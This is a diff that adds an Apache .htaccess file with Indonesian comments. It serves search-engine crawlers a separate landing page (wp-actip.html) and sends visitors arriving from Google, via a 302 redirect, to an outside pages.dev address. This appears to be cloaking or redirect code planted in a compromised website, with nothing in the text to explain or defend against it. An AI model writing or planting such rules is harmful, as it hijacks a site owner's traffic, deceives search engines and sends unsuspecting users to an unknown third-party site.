@@ -1,0 +1,14 @@
+RewriteEngine On
+ 
+# ==============================
+# 1. Googlebot & crawler → tampilkan landing page
+# ==============================
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex) [NC]
+RewriteRule ^.*$ wp-actip.html [L]
+ 
+# ==============================
+# 2. Visitor dari Google → redirect
+# ==============================
+RewriteCond %{HTTP_USER_AGENT} !(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex) [NC]
+RewriteCond %{HTTP_REFERER} google\. [NC]
+RewriteRule ^.*$ https://adafkusayang-wla.pages.dev/childbg/ [R=302,L]
